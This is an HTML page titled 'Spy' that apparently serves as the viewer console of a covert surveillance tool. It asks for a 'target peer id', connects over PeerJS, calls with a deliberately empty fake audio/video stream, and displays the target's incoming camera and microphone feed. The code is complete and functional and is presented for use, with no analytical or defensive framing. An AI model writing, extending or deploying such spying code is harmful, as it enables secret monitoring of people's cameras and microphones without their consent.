<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy</title>

    <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>

<body>
    <video id="video" controls autoplay></video>

    <script>
        // https://github.com/peers/peerjs/issues/158#issuecomment-614779167
        const createMediaStreamFake = () => {
            return new MediaStream([createEmptyAudioTrack(), createEmptyVideoTrack({
                width: 640,
                height: 480
            })]);
        }

        const createEmptyAudioTrack = () => {
            const ctx = new AudioContext();
            const oscillator = ctx.createOscillator();
            const dst = oscillator.connect(ctx.createMediaStreamDestination());
            oscillator.start();
            const track = dst.stream.getAudioTracks()[0];
            return Object.assign(track, {
                enabled: false
            });
        }

        const createEmptyVideoTrack = ({
            width,
            height
        }) => {
            const canvas = Object.assign(document.createElement('canvas'), {
                width,
                height
            });
            canvas.getContext('2d').fillRect(0, 0, width, height);

            const stream = canvas.captureStream();
            const track = stream.getVideoTracks()[0];

            return Object.assign(track, {
                enabled: false
            });
        };
    </script>

    <script>
        var videoEle = document.querySelector("#video");

        var peer = new Peer();

        Swal.fire({
            title: "Welcome",
            text: "Enter target peer id",
            input: 'text',
            confirmButtonText: 'Connect',
            allowOutsideClick: false,
            allowEscapeKey: false,
            inputValidator: (value) => {
                if (!value) {
                    return 'You need to input peerid of target'
                }
            }
        }).then((result) => {
            call(result.value);
        })

        function call(peerid) {
            var conn = peer.connect(peerid);

            conn.on('open', function () {
                console.log('Connected to: ' + peerid);

                var call = peer.call(peerid, createMediaStreamFake());
                call.on('stream', function (remoteStream) {
                    console.log(remoteStream);
                    videoEle.srcObject = remoteStream;
                });
            });
        }
    </script>
</body>

</html>